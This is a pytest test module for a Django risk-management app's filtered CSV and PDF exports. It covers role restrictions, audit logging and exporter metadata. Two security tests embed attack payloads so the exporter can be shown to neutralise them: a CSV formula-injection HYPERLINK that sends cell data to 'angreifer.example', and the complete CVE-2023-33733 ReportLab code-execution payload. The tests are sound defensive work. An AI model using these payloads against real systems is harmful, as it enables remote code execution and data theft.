"""US-04a (CSV) and US-04b (PDF): filtered export for risk managers, M-01, M-07, M-08, T-04."""

import csv
import io
import re
from pathlib import Path

import pytest
from django.test import Client
from pypdf import PdfReader

from apps.accounts.models import User
from apps.audit.models import AuditAction, AuditEntry
from apps.exports import pdf_client
from apps.exports.models import Export
from apps.risks.models import Risk, RiskCategory, RiskStatus
from pdf_renderer.render import render
from tests.conftest import MakeRisk

pytestmark = pytest.mark.django_db

CVE_2023_33733 = (
    "<para><font color=\"[ [ getattr(pow,Word('__globals__'))['os'].system('touch {marker}') "
    "for Word in [orgTypeFun('Word', (str,), {{ 'mutated': 1, 'startswith': lambda self, x: "
    "False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, "
    "'mutate': lambda self: {{setattr(self, 'mutated', self.mutated - 1)}}, '__hash__': lambda "
    "self: hash(str(self)) }})] ] for orgTypeFun in [type(type(1))] ] and 'red'\">exploit</font>"
    "</para>"
)


@pytest.fixture(autouse=True)
def inprocess_renderer(monkeypatch: pytest.MonkeyPatch) -> None:
    """Tests render in-process; in the stack the web container calls the pdf-renderer service."""
    monkeypatch.setattr(pdf_client, "render_pdf", render)


@pytest.fixture
def rm_client(client: Client, users: dict[str, User]) -> Client:
    users["rm"].first_name, users["rm"].last_name = "Rita", "Müller"
    users["rm"].save()
    client.force_login(users["rm"])
    return client


@pytest.fixture
def register(make_risk: MakeRisk) -> dict[str, Risk]:
    return {
        "crit": make_risk(RiskStatus.ESCALATED, probability=5, impact=4),
        "it": make_risk(
            RiskStatus.SCORED, category=RiskCategory.IT_RISIKO, probability=2, impact=3
        ),
        "low": make_risk(RiskStatus.VALIDATED, probability=1, impact=2),
    }


def _csv_rows(response) -> list[dict[str, str]]:
    text = response.content.decode("utf-8-sig")
    return list(csv.DictReader(io.StringIO(text), delimiter=";"))


def _pdf_text(response) -> list[str]:
    reader = PdfReader(io.BytesIO(response.content))
    return [page.extract_text() for page in reader.pages]


# --- US-04a: CSV ----------------------------------------------------------------------------


@pytest.mark.req("US-04a")
def test_us_04a_csv_contains_exactly_the_filtered_risks(
    rm_client: Client, register: dict[str, Risk]
) -> None:
    response = rm_client.get("/export/csv/?category=IS_RISIKO")

    assert response.status_code == 200
    assert response["Content-Type"].startswith("text/csv")
    ids = {row["Kennung"] for row in _csv_rows(response)}
    assert ids == {str(register["crit"].pk), str(register["low"].pk)}


@pytest.mark.req("US-04a")
def test_us_04a_csv_columns_and_values(rm_client: Client, register: dict[str, Risk]) -> None:
    row = _csv_rows(rm_client.get("/export/csv/?level=critical"))[0]
    assert list(row)[:4] == ["Kennung", "Titel", "Beschreibung", "Kategorie"]
    assert row["Kategorie"] == "IS-Risiko"
    assert (row["Eintrittswahrscheinlichkeit"], row["Schadensausmaß"], row["Risikowert"]) == (
        "5",
        "4",
        "20",
    )
    assert row["Risikostufe"] == "kritisch"
    assert row["Status"] == "Eskaliert"


@pytest.mark.req("M-08")
def test_m_08_csv_names_exporter_and_time(rm_client: Client, register: dict[str, Risk]) -> None:
    response = rm_client.get("/export/csv/?status=SCORED")

    rows = _csv_rows(response)
    assert rows and all(r["Exportiert von"] == "Rita Müller (rm.mueller)" for r in rows)
    assert all(re.fullmatch(r"\d\d\.\d\d\.\d{4} \d\d:\d\d", r["Exportiert am"]) for r in rows)
    disposition = response["Content-Disposition"]
    assert re.search(r'filename="risiken_\d{8}-\d{4}_rm\.mueller\.csv"', disposition)


@pytest.mark.req("T-04")
@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_t_04_formula_injection_is_neutralised(
    prefix: str, rm_client: Client, make_risk: MakeRisk
) -> None:
    risk = make_risk(RiskStatus.SCORED)
    risk.title = f'{prefix}HYPERLINK("http://angreifer.example/?d="&A1;"klick")'
    risk.save()

    row = _csv_rows(rm_client.get("/export/csv/?status=SCORED"))[0]

    assert row["Titel"] == "'" + risk.title


# --- US-04b: PDF ----------------------------------------------------------------------------


@pytest.mark.req("US-04b")
def test_us_04b_pdf_contains_exactly_the_filtered_risks(
    rm_client: Client, register: dict[str, Risk]
) -> None:
    for key in register:
        register[key].title = f"Risiko-{key}"
        register[key].save()

    response = rm_client.get("/export/pdf/?category=IT_RISIKO")

    assert response.status_code == 200
    assert response["Content-Type"] == "application/pdf"
    text = "\n".join(_pdf_text(response))
    assert "Risiko-it" in text
    assert "Risiko-crit" not in text and "Risiko-low" not in text


@pytest.mark.req("M-08")
def test_m_08_every_pdf_page_names_exporter_and_time(
    rm_client: Client, make_risk: MakeRisk
) -> None:
    for _ in range(25):
        make_risk(RiskStatus.SCORED)

    response = rm_client.get("/export/pdf/?status=SCORED")

    pages = _pdf_text(response)
    assert len(pages) > 1
    for page in pages:
        assert re.search(
            r"Exportiert von Rita Müller \(rm\.mueller\) am \d\d\.\d\d\.\d{4} \d\d:\d\d", page
        )
    metadata = PdfReader(io.BytesIO(response.content)).metadata
    assert metadata is not None
    assert metadata.author == "Rita Müller (rm.mueller)"
    assert re.search(
        r'filename="risiken_\d{8}-\d{4}_rm\.mueller\.pdf"', response["Content-Disposition"]
    )


@pytest.mark.req("M-01")
def test_m_01_markup_in_user_input_is_printed_as_text(
    rm_client: Client, make_risk: MakeRisk
) -> None:
    risk = make_risk(RiskStatus.SCORED)
    risk.title = "<b>fett</b>"
    risk.description = 'Text mit <font color="red">Markup</font> & Ampersand'
    risk.save()

    text = "\n".join(_pdf_text(rm_client.get("/export/pdf/?status=SCORED")))

    assert "<b>fett</b>" in text
    assert '<font color="red">Markup</font> & Ampersand' in text


@pytest.mark.req("M-01")
def test_m_01_cve_2023_33733_payload_is_not_evaluated(
    rm_client: Client, make_risk: MakeRisk, tmp_path: Path
) -> None:
    marker = tmp_path / "pwned"
    risk = make_risk(RiskStatus.SCORED)
    risk.description = CVE_2023_33733.format(marker=marker)
    risk.save()

    response = rm_client.get("/export/pdf/?status=SCORED")

    assert response.status_code == 200
    assert not marker.exists()
    assert "orgTypeFun" in "".join(_pdf_text(response))


@pytest.mark.req("US-04b")
def test_us_04b_renderer_failure_is_reported(
    rm_client: Client, register: dict[str, Risk], monkeypatch: pytest.MonkeyPatch
) -> None:
    def broken(payload: dict[str, object]) -> bytes:
        raise pdf_client.PdfRenderError("down")

    monkeypatch.setattr(pdf_client, "render_pdf", broken)
    response = rm_client.get("/export/pdf/?status=SCORED", follow=True)
    assert "PDF konnte nicht erzeugt werden" in response.content.decode()
    assert not Export.objects.exists()


# --- M-07 -----------------------------------------------------------------------------------


@pytest.mark.req("M-07")
@pytest.mark.parametrize("fmt", ["csv", "pdf"])
@pytest.mark.parametrize("role_key", ["nutzer", "ciso", "admin"])
def test_m_07_only_risk_managers_export(
    fmt: str, role_key: str, client: Client, users: dict[str, User], register: dict[str, Risk]
) -> None:
    client.force_login(users[role_key])
    assert client.get(f"/export/{fmt}/?status=SCORED").status_code == 403
    assert client.get("/export/").status_code == 403


@pytest.mark.req("M-07")
@pytest.mark.parametrize("fmt", ["csv", "pdf"])
@pytest.mark.parametrize("query", ["", "?status=", "?level=unbekannt", "?p=9"])
def test_m_07_unfiltered_export_is_refused(
    fmt: str, query: str, rm_client: Client, register: dict[str, Risk]
) -> None:
    response = rm_client.get(f"/export/{fmt}/{query}", follow=True)

    assert response.redirect_chain[-1][0].startswith("/export/")
    assert "mindestens einen Filter" in response.content.decode()
    assert not AuditEntry.objects.filter(action=AuditAction.EXPORTED).exists()


@pytest.mark.req("M-07")
def test_m_07_every_export_is_audited(
    rm_client: Client, users: dict[str, User], register: dict[str, Risk]
) -> None:
    rm_client.get("/export/csv/?category=IS_RISIKO")
    rm_client.get("/export/pdf/?level=critical")

    entries = AuditEntry.objects.filter(action=AuditAction.EXPORTED).order_by("created_at")
    assert [(e.actor, e.field) for e in entries] == [(users["rm"], "csv"), (users["rm"], "pdf")]
    assert "Kategorie: IS-Risiko" in entries[0].new_value
    assert "2 Risiken" in entries[0].new_value
    exports = Export.objects.order_by("created_at")
    assert [(x.format, x.row_count) for x in exports] == [("csv", 2), ("pdf", 1)]


@pytest.mark.req("M-07")
def test_m_07_export_page_offers_both_formats_with_the_filter(rm_client: Client) -> None:
    html = rm_client.get("/export/?category=IT_RISIKO").content.decode()
    assert 'formaction="/export/csv/"' in html
    assert 'formaction="/export/pdf/"' in html
